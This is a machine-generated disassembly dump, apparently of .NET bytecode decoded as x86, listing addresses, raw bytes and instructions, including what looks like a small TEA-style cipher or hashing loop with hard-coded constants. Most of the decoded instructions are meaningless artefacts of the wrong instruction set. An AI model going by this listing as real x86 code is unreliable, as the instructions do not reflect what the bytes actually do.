  4041a4:	13 05 2b 07 09 1f    	adc    0x1f09072b,%eax
  4041aa:	70 6a                	jo     0x404216
  4041ac:	58                   	pop    %eax
  4041ad:	13 05 11 05 28 93    	adc    0x93280511,%eax
  4041b3:	00 00                	add    %al,(%eax)
  4041b5:	0a 28                	or     (%eax),%ch
  4041b7:	94                   	xchg   %eax,%esp
  4041b8:	00 00                	add    %al,(%eax)
  4041ba:	0a 0a                	or     (%edx),%cl
  4041bc:	0f 00 28             	verw   (%eax)
  4041bf:	a0 00 00 0a 06       	mov    0x60a0000,%al
  4041c4:	6a 58                	push   $0x58
  4041c6:	1f                   	pop    %ds
  4041c7:	10 6a 58             	adc    %ch,0x58(%edx)
  4041ca:	28 93 00 00 0a 28    	sub    %dl,0x280a0000(%ebx)
  4041d0:	94                   	xchg   %eax,%esp
  4041d1:	00 00                	add    %al,(%eax)
  4041d3:	0a 13                	or     (%ebx),%dl
  4041d5:	06                   	push   %es
  4041d6:	0f 00 28             	verw   (%eax)
  4041d9:	a0 00 00 0a 06       	mov    0x60a0000,%al
  4041de:	6a 58                	push   $0x58
  4041e0:	1f                   	pop    %ds
  4041e1:	14 6a                	adc    $0x6a,%al
  4041e3:	58                   	pop    %eax
  4041e4:	28 93 00 00 0a 28    	sub    %dl,0x280a0000(%ebx)
  4041ea:	94                   	xchg   %eax,%esp
  4041eb:	00 00                	add    %al,(%eax)
  4041ed:	0a 26                	or     (%esi),%ah
  4041ef:	0f 00 28             	verw   (%eax)
  4041f2:	a0 00 00 0a 06       	mov    0x60a0000,%al
  4041f7:	6a 58                	push   $0x58
  4041f9:	1f                   	pop    %ds
  4041fa:	18 6a 58             	sbb    %ch,0x58(%edx)
  4041fd:	28 93 00 00 0a 28    	sub    %dl,0x280a0000(%ebx)
  404203:	94                   	xchg   %eax,%esp
  404204:	00 00                	add    %al,(%eax)
  404206:	0a 13                	or     (%ebx),%dl
  404208:	07                   	pop    %es
  404209:	0f 00 28             	verw   (%eax)
  40420c:	a0 00 00 0a 06       	mov    0x60a0000,%al
  404211:	6a 58                	push   $0x58
  404213:	1f                   	pop    %ds
  404214:	1c 6a                	sbb    $0x6a,%al
  404216:	58                   	pop    %eax
  404217:	28 93 00 00 0a 28    	sub    %dl,0x280a0000(%ebx)
  40421d:	94                   	xchg   %eax,%esp
  40421e:	00 00                	add    %al,(%eax)
  404220:	0a 13                	or     (%ebx),%dl
  404222:	08 0f                	or     %cl,(%edi)
  404224:	00 28                	add    %ch,(%eax)
  404226:	a0 00 00 0a 06       	mov    0x60a0000,%al
  40422b:	6a 58                	push   $0x58
  40422d:	1f                   	pop    %ds
  40422e:	20 6a 58             	and    %ch,0x58(%edx)
  404231:	28 93 00 00 0a 28    	sub    %dl,0x280a0000(%ebx)
  404237:	94                   	xchg   %eax,%esp
  404238:	00 00                	add    %al,(%eax)
  40423a:	0a 13                	or     (%ebx),%dl
  40423c:	09 0f                	or     %ecx,(%edi)
  40423e:	00 28                	add    %ch,(%eax)
  404240:	a0 00 00 0a 06       	mov    0x60a0000,%al
  404245:	6a 58                	push   $0x58
  404247:	1f                   	pop    %ds
  404248:	24 6a                	and    $0x6a,%al
  40424a:	58                   	pop    %eax
  40424b:	28 93 00 00 0a 28    	sub    %dl,0x280a0000(%ebx)
  404251:	94                   	xchg   %eax,%esp
  404252:	00 00                	add    %al,(%eax)
  404254:	0a 13                	or     (%ebx),%dl
  404256:	0a 16                	or     (%esi),%dl
  404258:	0b 38                	or     (%eax),%edi
  40425a:	8b 00                	mov    (%eax),%eax
  40425c:	00 00                	add    %al,(%eax)
  40425e:	0f 00 28             	verw   (%eax)
  404261:	a0 00 00 0a 0f       	mov    0xf0a0000,%al
  404266:	00 28                	add    %ch,(%eax)
  404268:	a0 00 00 0a 11       	mov    0x110a0000,%al
  40426d:	09 6a 58             	or     %ebp,0x58(%edx)
  404270:	07                   	pop    %es
  404271:	1a 5a 6a             	sbb    0x6a(%edx),%bl
  404274:	58                   	pop    %eax
  404275:	28 93 00 00 0a 28    	sub    %dl,0x280a0000(%ebx)
  40427b:	94                   	xchg   %eax,%esp
  40427c:	00 00                	add    %al,(%eax)
  40427e:	0a 6a 58             	or     0x58(%edx),%ch
  404281:	28 93 00 00 0a 28    	sub    %dl,0x280a0000(%ebx)
  404287:	a1 00 00 0a 03       	mov    0x30a0000,%eax
  40428c:	1b 6f a2             	sbb    -0x5e(%edi),%ebp
  40428f:	00 00                	add    %al,(%eax)
  404291:	0a 2c 51             	or     (%ecx,%edx,2),%ch
  404294:	0f 00 28             	verw   (%eax)
  404297:	a0 00 00 0a 11       	mov    0x110a0000,%al
  40429c:	0a 6a 58             	or     0x58(%edx),%ch
  40429f:	07                   	pop    %es
  4042a0:	18 5a 6a             	sbb    %bl,0x6a(%edx)
  4042a3:	58                   	pop    %eax
  4042a4:	28 93 00 00 0a 28    	sub    %dl,0x280a0000(%ebx)
  4042aa:	95                   	xchg   %eax,%ebp
  4042ab:	00 00                	add    %al,(%eax)
  4042ad:	0a 11                	or     (%ecx),%dl
  4042af:	06                   	push   %es
  4042b0:	58                   	pop    %eax
  4042b1:	13 0b                	adc    (%ebx),%ecx
  4042b3:	0f 00 28             	verw   (%eax)
  4042b6:	a0 00 00 0a 11       	mov    0x110a0000,%al
  4042bb:	08 6a 58             	or     %ch,0x58(%edx)
  4042be:	1a 11                	sbb    (%ecx),%dl
  4042c0:	0b 11                	or     (%ecx),%edx
  4042c2:	06                   	push   %es
  4042c3:	59                   	pop    %ecx
  4042c4:	5a                   	pop    %edx
  4042c5:	6a 58                	push   $0x58
  4042c7:	28 93 00 00 0a 28    	sub    %dl,0x280a0000(%ebx)
  4042cd:	94                   	xchg   %eax,%esp
  4042ce:	00 00                	add    %al,(%eax)
  4042d0:	0a 13                	or     (%ebx),%dl
  4042d2:	0c 02                	or     $0x2,%al
  4042d4:	28 92 00 00 0a 11    	sub    %dl,0x110a0000(%edx)
  4042da:	0c 6a                	or     $0x6a,%al
  4042dc:	58                   	pop    %eax
  4042dd:	28 93 00 00 0a 0c    	sub    %dl,0xc0a0000(%ebx)
  4042e3:	2b 0c 07             	sub    (%edi,%eax,1),%ecx
  4042e6:	17                   	pop    %ss
  4042e7:	58                   	pop    %eax
  4042e8:	0b 07                	or     (%edi),%eax
  4042ea:	11 07                	adc    %eax,(%edi)
  4042ec:	3f                   	aas
  4042ed:	6d                   	insl   (%dx),%es:(%edi)
  4042ee:	ff                   	(bad)
  4042ef:	ff                   	(bad)
  4042f0:	ff                   	lcall  (bad)
  4042f1:	de 07                	fiadds (%edi)
  4042f3:	26 73 a3             	es jae 0x404299
  4042f6:	00 00                	add    %al,(%eax)
  4042f8:	0a 7a 08             	or     0x8(%edx),%bh
  4042fb:	7e 8c                	jle    0x404289
  4042fd:	00 00                	add    %al,(%eax)
  4042ff:	0a 28                	or     (%eax),%ch
  404301:	8d 00                	lea    (%eax),%eax
  404303:	00 0a                	add    %cl,(%edx)
  404305:	2c 06                	sub    $0x6,%al
  404307:	73 a4                	jae    0x4042ad
  404309:	00 00                	add    %al,(%eax)
  40430b:	0a 7a 08             	or     0x8(%edx),%bh
  40430e:	2a 00                	sub    (%eax),%al
  404310:	41                   	inc    %ecx
  404311:	1c 00                	sbb    $0x0,%al
  404313:	00 00                	add    %al,(%eax)
  404315:	00 00                	add    %al,(%eax)
  404317:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40431a:	00 00                	add    %al,(%eax)
  40431c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40431d:	01 00                	add    %eax,(%eax)
  40431f:	00 b3 01 00 00 07    	add    %dh,0x7000001(%ebx)
  404325:	00 00                	add    %al,(%eax)
  404327:	00 34 00             	add    %dh,(%eax,%eax,1)
  40432a:	00 01                	add    %al,(%ecx)
  40432c:	1e                   	push   %ds
  40432d:	02 28                	add    (%eax),%ch
  40432f:	14 00                	adc    $0x0,%al
  404331:	00 0a                	add    %cl,(%edx)
  404333:	2a c2                	sub    %dl,%al
  404335:	7e 19                	jle    0x404350
  404337:	00 00                	add    %al,(%eax)
  404339:	04 2d                	add    $0x2d,%al
  40433b:	23 20                	and    (%eax),%esp
  40433d:	44                   	inc    %esp
  40433e:	0d 0a 98 28 19       	or     $0x1928980a,%eax
  404343:	00 00                	add    %al,(%eax)
  404345:	06                   	push   %es
  404346:	d0 12                	rclb   $1,(%edx)
  404348:	00 00                	add    %al,(%eax)
  40434a:	02 28                	add    (%eax),%ch
  40434c:	63 00                	arpl   %eax,(%eax)
  40434e:	00 0a                	add    %cl,(%edx)
  404350:	6f                   	outsl  %ds:(%esi),(%dx)
  404351:	78 00                	js     0x404353
  404353:	00 0a                	add    %cl,(%edx)
  404355:	73 a5                	jae    0x4042fc
  404357:	00 00                	add    %al,(%eax)
  404359:	0a 80 19 00 00 04    	or     0x4000019(%eax),%al
  40435f:	7e 19                	jle    0x40437a
  404361:	00 00                	add    %al,(%eax)
  404363:	04 2a                	add    $0x2a,%al
  404365:	00 00                	add    %al,(%eax)
  404367:	00 1a                	add    %bl,(%edx)
  404369:	7e 1a                	jle    0x404385
  40436b:	00 00                	add    %al,(%eax)
  40436d:	04 2a                	add    $0x2a,%al
  40436f:	00 1e                	add    %bl,(%esi)
  404371:	02 80 1a 00 00 04    	add    0x400001a(%eax),%al
  404377:	2a 7e 28             	sub    0x28(%esi),%bh
  40437a:	40                   	inc    %eax
  40437b:	00 00                	add    %al,(%eax)
  40437d:	06                   	push   %es
  40437e:	20 b1 0e 0a 98 28    	and    %dh,0x28980a0e(%ecx)
  404384:	19 00                	sbb    %eax,(%eax)
  404386:	00 06                	add    %al,(%esi)
  404388:	7e 1a                	jle    0x4043a4
  40438a:	00 00                	add    %al,(%eax)
  40438c:	04 6f                	add    $0x6f,%al
  40438e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40438f:	00 00                	add    %al,(%eax)
  404391:	0a 74 03 00          	or     0x0(%ebx,%eax,1),%dh
  404395:	00 1b                	add    %bl,(%ebx)
  404397:	2a 2e                	sub    (%esi),%ch
  404399:	73 4a                	jae    0x4043e5
  40439b:	00 00                	add    %al,(%eax)
  40439d:	06                   	push   %es
  40439e:	80 1b 00             	sbbb   $0x0,(%ebx)
  4043a1:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4043a4:	1b 30                	sbb    (%eax),%esi
  4043a6:	04 00                	add    $0x0,%al
  4043a8:	88 01                	mov    %al,(%ecx)
  4043aa:	00 00                	add    %al,(%eax)
  4043ac:	19 00                	sbb    %eax,(%eax)
  4043ae:	00 11                	add    %dl,(%ecx)
  4043b0:	28 68 00             	sub    %ch,0x0(%eax)
  4043b3:	00 0a                	add    %cl,(%edx)
  4043b5:	d0 14 00             	rclb   $1,(%eax,%eax,1)
  4043b8:	00 02                	add    %al,(%edx)
  4043ba:	28 63 00             	sub    %ah,0x0(%ebx)
  4043bd:	00 0a                	add    %cl,(%edx)
  4043bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4043c0:	78 00                	js     0x4043c2
  4043c2:	00 0a                	add    %cl,(%edx)
  4043c4:	33 07                	xor    (%edi),%eax
  4043c6:	28 47 00             	sub    %al,0x0(%edi)
  4043c9:	00 06                	add    %al,(%esi)
  4043cb:	2d 03 16 6a 2a       	sub    $0x2a6a1603,%eax
  4043d0:	7e 1b                	jle    0x4043ed
  4043d2:	00 00                	add    %al,(%eax)
  4043d4:	04 25                	add    $0x25,%al
  4043d6:	13 0b                	adc    (%ebx),%ecx
  4043d8:	28 a7 00 00 0a 7e    	sub    %ah,0x7e0a0000(%edi)
  4043de:	1b 00                	sbb    (%eax),%eax
  4043e0:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4043e3:	4b                   	dec    %ebx
  4043e4:	00 00                	add    %al,(%eax)
  4043e6:	06                   	push   %es
  4043e7:	0c 08                	or     $0x8,%al
  4043e9:	16                   	push   %ss
  4043ea:	6a 40                	push   $0x40
  4043ec:	38 01                	cmp    %al,(%ecx)
  4043ee:	00 00                	add    %al,(%eax)
  4043f0:	28 67 00             	sub    %ah,0x0(%edi)
  4043f3:	00 0a                	add    %cl,(%edx)
  4043f5:	13 08                	adc    (%eax),%ecx
  4043f7:	73 a8                	jae    0x4043a1
  4043f9:	00 00                	add    %al,(%eax)
  4043fb:	0a 0b                	or     (%ebx),%cl
  4043fd:	11 08                	adc    %ecx,(%eax)
  4043ff:	6f                   	outsl  %ds:(%esi),(%dx)
  404400:	74 00                	je     0x404402
  404402:	00 0a                	add    %cl,(%edx)
  404404:	13 07                	adc    (%edi),%eax
  404406:	de 11                	ficoms (%ecx)
  404408:	26 11 08             	adc    %ecx,%es:(%eax)
  40440b:	6f                   	outsl  %ds:(%esi),(%dx)
  40440c:	75 00                	jne    0x40440e
  40440e:	00 0a                	add    %cl,(%edx)
  404410:	73 76                	jae    0x404488
  404412:	00 00                	add    %al,(%eax)
  404414:	0a 13                	or     (%ebx),%dl
  404416:	07                   	pop    %es
  404417:	de 00                	fiadds (%eax)
  404419:	11 07                	adc    %eax,(%edi)
  40441b:	6f                   	outsl  %ds:(%esi),(%dx)
  40441c:	77 00                	ja     0x40441e
  40441e:	00 0a                	add    %cl,(%edx)
  404420:	0d 09 2c 07 09       	or     $0x9072c09,%eax
  404425:	8e 69 2d             	mov    0x2d(%ecx),%gs
  404428:	02 14 0d 09 2c 07 07 	add    0x7072c09(,%ecx,1),%dl
  40442f:	09 6f a9             	or     %ebp,-0x57(%edi)
  404432:	00 00                	add    %al,(%eax)
  404434:	0a 07                	or     (%edi),%al
  404436:	28 6e 00             	sub    %ch,0x0(%esi)
  404439:	00 0a                	add    %cl,(%edx)
  40443b:	11 07                	adc    %eax,(%edi)
  40443d:	6f                   	outsl  %ds:(%esi),(%dx)
  40443e:	aa                   	stos   %al,%es:(%edi)
  40443f:	00 00                	add    %al,(%eax)
  404441:	0a 6f ab             	or     -0x55(%edi),%ch
  404444:	00 00                	add    %al,(%eax)
  404446:	0a 6f a9             	or     -0x57(%edi),%ch
  404449:	00 00                	add    %al,(%eax)
  40444b:	0a d0                	or     %al,%dl
  40444d:	14 00                	adc    $0x0,%al
  40444f:	00 02                	add    %al,(%edx)
  404451:	28 63 00             	sub    %ah,0x0(%ebx)
  404454:	00 0a                	add    %cl,(%edx)
  404456:	28 49 00             	sub    %cl,0x0(%ecx)
  404459:	00 06                	add    %al,(%esi)
  40445b:	13 05 28 53 00 00    	adc    0x5328,%eax
  404461:	06                   	push   %es
  404462:	13 06                	adc    (%esi),%eax
  404464:	07                   	pop    %es
  404465:	11 05 1f 10 63 d2    	adc    %eax,0xd263101f
  40446b:	6f                   	outsl  %ds:(%esi),(%dx)
  40446c:	ac                   	lods   %ds:(%esi),%al
  40446d:	00 00                	add    %al,(%eax)
  40446f:	0a 07                	or     (%edi),%al
  404471:	11 06                	adc    %eax,(%esi)
  404473:	1f                   	pop    %ds
  404474:	18 63 d2             	sbb    %ah,-0x2e(%ebx)
  404477:	6f                   	outsl  %ds:(%esi),(%dx)
  404478:	ac                   	lods   %ds:(%esi),%al
  404479:	00 00                	add    %al,(%eax)
  40447b:	0a 07                	or     (%edi),%al
  40447d:	11 05 1f 18 63 d2    	adc    %eax,0xd263181f
  404483:	6f                   	outsl  %ds:(%esi),(%dx)
  404484:	ac                   	lods   %ds:(%esi),%al
  404485:	00 00                	add    %al,(%eax)
  404487:	0a 07                	or     (%edi),%al
  404489:	11 06                	adc    %eax,(%esi)
  40448b:	1e                   	push   %ds
  40448c:	63 d2                	arpl   %edx,%edx
  40448e:	6f                   	outsl  %ds:(%esi),(%dx)
  40448f:	ac                   	lods   %ds:(%esi),%al
  404490:	00 00                	add    %al,(%eax)
  404492:	0a 07                	or     (%edi),%al
  404494:	11 05 d2 6f ac 00    	adc    %eax,0xac6fd2
  40449a:	00 0a                	add    %cl,(%edx)
  40449c:	07                   	pop    %es
  40449d:	11 06                	adc    %eax,(%esi)
  40449f:	d2 6f ac             	shrb   %cl,-0x54(%edi)
  4044a2:	00 00                	add    %al,(%eax)
  4044a4:	0a 07                	or     (%edi),%al
  4044a6:	11 05 1e 63 d2 6f    	adc    %eax,0x6fd2631e
  4044ac:	ac                   	lods   %ds:(%esi),%al
  4044ad:	00 00                	add    %al,(%eax)
  4044af:	0a 07                	or     (%edi),%al
  4044b1:	11 06                	adc    %eax,(%esi)
  4044b3:	1f                   	pop    %ds
  4044b4:	10 63 d2             	adc    %ah,-0x2e(%ebx)
  4044b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4044b8:	ac                   	lods   %ds:(%esi),%al
  4044b9:	00 00                	add    %al,(%eax)
  4044bb:	0a 07                	or     (%edi),%al
  4044bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4044be:	ad                   	lods   %ds:(%esi),%eax
  4044bf:	00 00                	add    %al,(%eax)
  4044c1:	0a 13                	or     (%ebx),%dl
  4044c3:	09 16                	or     %edx,(%esi)
  4044c5:	6a 0a                	push   $0xa
  4044c7:	16                   	push   %ss
  4044c8:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  4044cb:	29 06                	sub    %eax,(%esi)
  4044cd:	07                   	pop    %es
  4044ce:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  4044d1:	ae                   	scas   %es:(%edi),%al
  4044d2:	00 00                	add    %al,(%eax)
  4044d4:	0a 6e 58             	or     0x58(%esi),%ch
  4044d7:	0a 06                	or     (%esi),%al
  4044d9:	06                   	push   %es
  4044da:	1f                   	pop    %ds
  4044db:	14 62                	adc    $0x62,%al
  4044dd:	58                   	pop    %eax
  4044de:	0a 06                	or     (%esi),%al
  4044e0:	06                   	push   %es
  4044e1:	1f                   	pop    %ds
  4044e2:	0c 64                	or     $0x64,%al
  4044e4:	61                   	popa
  4044e5:	0a 07                	or     (%edi),%al
  4044e7:	11 04 16             	adc    %eax,(%esi,%edx,1)
  4044ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4044eb:	af                   	scas   %es:(%edi),%eax
  4044ec:	00 00                	add    %al,(%eax)
  4044ee:	0a 11                	or     (%ecx),%dl
  4044f0:	04 17                	add    $0x17,%al
  4044f2:	58                   	pop    %eax
  4044f3:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4044f6:	04 11                	add    $0x11,%al
  4044f8:	09 33                	or     %esi,(%ebx)
  4044fa:	d1 06                	roll   $1,(%esi)
  4044fc:	06                   	push   %es
  4044fd:	1c 62                	sbb    $0x62,%al
  4044ff:	58                   	pop    %eax
  404500:	0a 06                	or     (%esi),%al
  404502:	06                   	push   %es
  404503:	1f                   	pop    %ds
  404504:	16                   	push   %ss
  404505:	64 61                	fs popa
  404507:	0a 06                	or     (%esi),%al
  404509:	06                   	push   %es
  40450a:	1f                   	pop    %ds
  40450b:	1e                   	push   %ds
  40450c:	62 58 0a             	bound  %ebx,0xa(%eax)
  40450f:	06                   	push   %es
  404510:	0c 08                	or     $0x8,%al
  404512:	21 d6                	and    %edx,%esi
  404514:	cc                   	int3
  404515:	25 ee d0 4c 9c       	and    $0x9c4cd0ee,%eax
  40451a:	5e                   	pop    %esi
  40451b:	61                   	popa
  40451c:	0c 7e                	or     $0x7e,%al
  40451e:	1b 00                	sbb    (%eax),%eax
  404520:	00 04 08             	add    %al,(%eax,%ecx,1)
  404523:	6f                   	outsl  %ds:(%esi),(%dx)
  404524:	4c                   	dec    %esp
  404525:	00 00                	add    %al,(%eax)
  404527:	06                   	push   %es
  404528:	08 13                	or     %dl,(%ebx)
  40452a:	0a de                	or     %dh,%bl
  40452c:	08 11                	or     %dl,(%ecx)
  40452e:	0b 28                	or     (%eax),%ebp
  404530:	6d                   	insl   (%dx),%es:(%edi)
  404531:	00 00                	add    %al,(%eax)
  404533:	0a dc                	or     %ah,%bl
  404535:	11 0a                	adc    %ecx,(%edx)
  404537:	2a 41 34             	sub    0x34(%ecx),%al
  40453a:	00 00                	add    %al,(%eax)
  40453c:	00 00                	add    %al,(%eax)
  40453e:	00 00                	add    %al,(%eax)
  404540:	4d                   	dec    %ebp
  404541:	00 00                	add    %al,(%eax)
  404543:	00 0b                	add    %cl,(%ebx)
  404545:	00 00                	add    %al,(%eax)
  404547:	00 58 00             	add    %bl,0x0(%eax)
  40454a:	00 00                	add    %al,(%eax)
  40454c:	11 00                	adc    %eax,(%eax)
  40454e:	00 00                	add    %al,(%eax)
  404550:	34 00                	xor    $0x0,%al
  404552:	00 01                	add    %al,(%ecx)
  404554:	02 00                	add    (%eax),%al
  404556:	00 00                	add    %al,(%eax)
  404558:	2d 00 00 00 50       	sub    $0x50000000,%eax
  40455d:	01 00                	add    %eax,(%eax)
  40455f:	00 7d 01             	add    %bh,0x1(%ebp)
  404562:	00 00                	add    %al,(%eax)
  404564:	08 00                	or     %al,(%eax)
  404566:	00 00                	add    %al,(%eax)
  404568:	00 00                	add    %al,(%eax)
  40456a:	00 00                	add    %al,(%eax)
  40456c:	2e 28 48 00          	sub    %cl,%cs:0x0(%eax)
  404570:	00 06                	add    %al,(%esi)
  404572:	2d 02 16 2a 17       	sub    $0x172a1602,%eax
  404577:	2a 13                	sub    (%ebx),%dl
  404579:	30 02                	xor    %al,(%edx)
  40457b:	00 57 00             	add    %dl,0x0(%edi)
  40457e:	00 00                	add    %al,(%eax)
  404580:	1a 00                	sbb    (%eax),%al
  404582:	00 11                	add    %dl,(%ecx)
  404584:	73 60                	jae    0x4045e6
  404586:	00 00                	add    %al,(%eax)
  404588:	0a 0a                	or     (%edx),%cl
  40458a:	06                   	push   %es
  40458b:	19 6f 5f             	sbb    %ebp,0x5f(%edi)
  40458e:	00 00                	add    %al,(%eax)
  404590:	0a 0b                	or     (%ebx),%cl
  404592:	07                   	pop    %es
  404593:	2c 08                	sub    $0x8,%al
  404595:	07                   	pop    %es
  404596:	6f                   	outsl  %ds:(%esi),(%dx)
  404597:	61                   	popa
  404598:	00 00                	add    %al,(%eax)
  40459a:	0a 2b                	or     (%ebx),%ch
  40459c:	01 14 0c             	add    %edx,(%esp,%ecx,1)
  40459f:	08 2c 08             	or     %ch,(%eax,%ecx,1)
  4045a2:	08 6f 62             	or     %ch,0x62(%edi)
  4045a5:	00 00                	add    %al,(%eax)
  4045a7:	0a 2b                	or     (%ebx),%ch
  4045a9:	01 14 0d 09 d0 4c 00 	add    %edx,0x4cd009(,%ecx,1)
  4045b0:	00 01                	add    %al,(%ecx)
  4045b2:	28 63 00             	sub    %ah,0x0(%ebx)
  4045b5:	00 0a                	add    %cl,(%edx)
  4045b7:	33 02                	xor    (%edx),%eax
  4045b9:	16                   	push   %ss
  4045ba:	2a 09                	sub    (%ecx),%cl
  4045bc:	2d 02 16 2a 09       	sub    $0x92a1602,%eax
  4045c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4045c2:	78 00                	js     0x4045c4
  4045c4:	00 0a                	add    %cl,(%edx)
  4045c6:	d0 14 00             	rclb   $1,(%eax,%eax,1)
  4045c9:	00 02                	add    %al,(%edx)
  4045cb:	28 63 00             	sub    %ah,0x0(%ebx)
  4045ce:	00 0a                	add    %cl,(%edx)
  4045d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4045d1:	78 00                	js     0x4045d3
  4045d3:	00 0a                	add    %cl,(%edx)
  4045d5:	2e 02 16             	add    %cs:(%esi),%dl
  4045d8:	2a 17                	sub    (%edi),%dl
  4045da:	2a 00                	sub    (%eax),%al
  4045dc:	1e                   	push   %ds
  4045dd:	02 6f b0             	add    -0x50(%edi),%ch
  4045e0:	00 00                	add    %al,(%eax)
  4045e2:	0a 2a                	or     (%edx),%ch
  4045e4:	3e 02 28             	add    %ds:(%eax),%ch
  4045e7:	14 00                	adc    $0x0,%al
  4045e9:	00 0a                	add    %cl,(%edx)
  4045eb:	02 16                	add    (%esi),%dl
  4045ed:	6a 28                	push   $0x28
  4045ef:	4c                   	dec    %esp
  4045f0:	00 00                	add    %al,(%eax)
  4045f2:	06                   	push   %es
  4045f3:	2a 13                	sub    (%ebx),%dl
  4045f5:	30 06                	xor    %al,(%esi)
  4045f7:	00 14 01             	add    %dl,(%ecx,%eax,1)
  4045fa:	00 00                	add    %al,(%eax)
  4045fc:	1b 00                	sbb    (%eax),%eax
  4045fe:	00 11                	add    %dl,(%ecx)
  404600:	28 68 00             	sub    %ch,0x0(%eax)
  404603:	00 0a                	add    %cl,(%edx)
  404605:	d0 15 00 00 02 28    	rclb   $1,0x28020000
  40460b:	63 00                	arpl   %eax,(%eax)
  40460d:	00 0a                	add    %cl,(%edx)
  40460f:	6f                   	outsl  %ds:(%esi),(%dx)
  404610:	78 00                	js     0x404612
  404612:	00 0a                	add    %cl,(%edx)
  404614:	2e 07                	cs pop %es
  404616:	20 f0                	and    %dh,%al
  404618:	87 2c 00             	xchg   %ebp,(%eax,%eax,1)
  40461b:	6a 2a                	push   $0x2a
  40461d:	28 47 00             	sub    %al,0x0(%edi)
  404620:	00 06                	add    %al,(%esi)
  404622:	2d 07 20 f0 87       	sub    $0x87f02007,%eax
  404627:	2c 00                	sub    $0x0,%al
  404629:	6a 2a                	push   $0x2a
  40462b:	1a 8d 2d 00 00 01    	sbb    0x100002d(%ebp),%cl
  404631:	0a 06                	or     (%esi),%al
  404633:	19 20                	sbb    %esp,(%eax)
  404635:	a9 c1 41 38 66       	test   $0x663841c1,%eax
  40463a:	65 66 66 65 66 65 65 	gs data16 data16 gs data16 gs gs data16 data16 gs sahf
  404641:	66 66 65 9e 
  404645:	06                   	push   %es
  404646:	17                   	pop    %ss
  404647:	20 ea                	and    %ch,%dl
  404649:	37                   	aaa
  40464a:	7e 2d                	jle    0x404679
  40464c:	66 66 65 65 66 66 65 	data16 data16 gs gs data16 data16 gs data16 gs data16 gs sahf
  404653:	66 65 66 65 9e 
  404658:	06                   	push   %es
  404659:	18 20                	sbb    %ah,(%eax)
  40465b:	48                   	dec    %eax
  40465c:	d2 f6                	shl    %cl,%dh
  40465e:	40                   	inc    %eax
  40465f:	66 65 66 65 66 65 66 	data16 gs data16 gs data16 gs data16 gs data16 data16 gs sahf
  404666:	65 66 66 65 9e 
  40466b:	06                   	push   %es
  40466c:	16                   	push   %ss
  40466d:	20 1a                	and    %bl,(%edx)
  40466f:	6d                   	insl   (%dx),%es:(%edi)
  404670:	2d d5 66 65 66       	sub    $0x666566d5,%eax
  404675:	66 65 65 66 65 66 9e 	data16 gs gs data16 gs data16 sahf
  40467c:	02 7b 1c             	add    0x1c(%ebx),%bh
  40467f:	00 00                	add    %al,(%eax)
  404681:	04 0b                	add    $0xb,%al
  404683:	02 7b 1d             	add    0x1d(%ebx),%bh
  404686:	00 00                	add    %al,(%eax)
  404688:	04 0c                	add    $0xc,%al
  40468a:	20 47 86             	and    %al,-0x7a(%edi)
  40468d:	c8 61 66 65          	enter  $0x6661,$0x65
  404691:	66 66 65 66 65 65 66 	data16 data16 gs data16 gs gs data16 adc %gs:(%edi),%ax
  404698:	66 65 13 07 
  40469c:	20 de                	and    %bl,%dh
  40469e:	c8 10 39 66          	enter  $0x3910,$0x66
  4046a2:	66 65 65 66 66 65 65 	data16 gs gs data16 data16 gs gs data16 gs or $0x1316,%ax
  4046a9:	66 65 66 0d 16 13 
  4046af:	05 2b 36 08 07       	add    $0x708362b,%eax
  4046b4:	1a 62 07             	sbb    0x7(%edx),%ah
  4046b7:	1b 63 61             	sbb    0x61(%ebx),%esp
  4046ba:	07                   	pop    %es
  4046bb:	58                   	pop    %eax
  4046bc:	09 06                	or     %eax,(%esi)
  4046be:	09 1f                	or     %ebx,(%edi)
  4046c0:	0b 63 19             	or     0x19(%ebx),%esp
  4046c3:	5f                   	pop    %edi
  4046c4:	94                   	xchg   %eax,%esp
  4046c5:	58                   	pop    %eax
  4046c6:	61                   	popa
  4046c7:	59                   	pop    %ecx
  4046c8:	0c 09                	or     $0x9,%al
  4046ca:	11 07                	adc    %eax,(%edi)
  4046cc:	59                   	pop    %ecx
  4046cd:	0d 07 08 1a 62       	or     $0x621a0807,%eax
  4046d2:	08 1b                	or     %bl,(%ebx)
  4046d4:	63 61 08             	arpl   %esp,0x8(%ecx)
  4046d7:	58                   	pop    %eax
  4046d8:	09 06                	or     %eax,(%esi)
  4046da:	09 19                	or     %ebx,(%ecx)
  4046dc:	5f                   	pop    %edi
  4046dd:	94                   	xchg   %eax,%esp
  4046de:	58                   	pop    %eax
  4046df:	61                   	popa
  4046e0:	59                   	pop    %ecx
  4046e1:	0b 11                	or     (%ecx),%edx
  4046e3:	05 17 58 13 05       	add    $0x5135817,%eax
  4046e8:	11 05 1f 20 33 c4    	adc    %eax,0xc433201f
  4046ee:	16                   	push   %ss
  4046ef:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  4046f2:	0b 06                	or     (%esi),%eax
  4046f4:	11 04 16             	adc    %eax,(%esi,%edx,1)
  4046f7:	9e                   	sahf
  4046f8:	11 04 17             	adc    %eax,(%edi,%edx,1)
  4046fb:	58                   	pop    %eax
  4046fc:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4046ff:	04 1a                	add    $0x1a,%al
  404701:	33 f0                	xor    %eax,%esi
  404703:	08 6a 1f             	or     %ch,0x1f(%edx)
  404706:	20 62 13             	and    %ah,0x13(%edx)
  404709:	06                   	push   %es
  40470a:	11 06                	adc    %eax,(%esi)
  40470c:	07                   	pop    %es
  40470d:	6e                   	outsb  %ds:(%esi),(%dx)
  40470e:	60                   	pusha
  40470f:	13 06                	adc    (%esi),%eax
  404711:	11 06                	adc    %eax,(%esi)
  404713:	2a 13                	sub    (%ebx),%dl
  404715:	30 06                	xor    %al,(%esi)
  404717:	00 f0                	add    %dh,%al
  404719:	00 00                	add    %al,(%eax)
  40471b:	00 1c 00             	add    %bl,(%eax,%eax,1)
